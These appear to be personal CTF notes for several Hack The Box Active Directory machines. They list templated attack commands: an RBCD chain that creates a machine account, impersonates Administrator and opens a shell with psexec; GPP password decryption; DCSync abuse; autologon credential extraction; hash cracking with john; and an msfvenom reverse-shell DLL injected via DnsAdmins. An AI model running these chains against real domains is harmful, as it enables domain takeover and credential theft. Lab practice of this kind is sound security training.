
#### Resourced => RBCD 
1. Check enum4linux properly! `crackmapexec winrm {{DC_IP}} -u names.txt -H hashes.txt` 
2. User has SeMachineAccountPrivilege = can create machine accounts even if ms-DS-MachineAccountQuota = 0 
3. `impacket-addcomputer -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host {{DC_IP}} -domain-netbios {{DOMAIN}} '{{DOMAIN}}/{{USERNAME}}' -hashes ':{{HASH}}'` 
4. `impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to '{{MACHINE_NAME}}$' -action 'write' '{{DOMAIN}}/{{USERNAME}}' -hashes ':{{HASH}}' -dc-ip {{DC_IP}}` 
5. `impacket-getST -spn 'cifs/{{MACHINE_NAME}}.{{DOMAIN}}' -impersonate 'Administrator' '{{DOMAIN}}/attackersystem$:Summer2018!' -dc-ip {{DC_IP}}` 
6. `export KRB5CCNAME=./{{KERBEROS_TICKET}}.ccache` 
7. `impacket-psexec {{MACHINE_NAME}}.{{DOMAIN}}  -target-ip {{DC_IP}} -k -no-pass"` 


#### Active => GPP in xml 
SMB: ` gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ ` 

#### Cascade => pw in ldapsearch 
1. 1st password Base64 encoded! 2nd password TightVNC encrypted. 
2. 3rd password custom encoded = https://dev.to/micheaol/htb-cascade-walkthrough-1pik 
3. ` Get-ADObject -Filter 'isDeleted -eq $true -and name -like "*Admin*"' -IncludeDeletedObjects -Properties * ` 

#### Forest => LDAP 
1. Run ldapsearch, rpcclient, enum4linux to get users 
2. Run net users, whoami, bloodhound to see *WriteDACL* = can grant DCsync 
3. Add user to group with WriteDACL 

#### Sauna => usernames from website 
1. WinPEAS found autologon creds 
2. ` reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon" ` 
3. User has GetChanges & GetChangesAll = can do DCsync 

#### Support => decompile UserInfo.exe 
1. Can use https://github.com/dnSpy/dnSpy or `ilspycmd -p -o reverse_userinfo UserInfo.exe` 
2. Find pw in ldapsearch **'info'** field 
3. Group has GenericAll on domain = reset password for DC$ machine 

#### Timelapse => john the zip 
1. ` zip2john backup.zip > zip.hash ` then ` john ziphash.txt > pw.txt ` 
2. ` pfx2john auth.pfx > pfxhash.hash ` then ` john pfxhash.txt > pfxcracked.txt ` 

#### Resolute => pw in discription 
1. Run rpcclient `querydispinfo` to get password 
2. Run `dir -force` to see hidden files 
3. User is in DnsAdmins group = use dnscmd.exe to inject msfvenom DLL 
4. `msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT=443 -f dll -o rev.dll` 
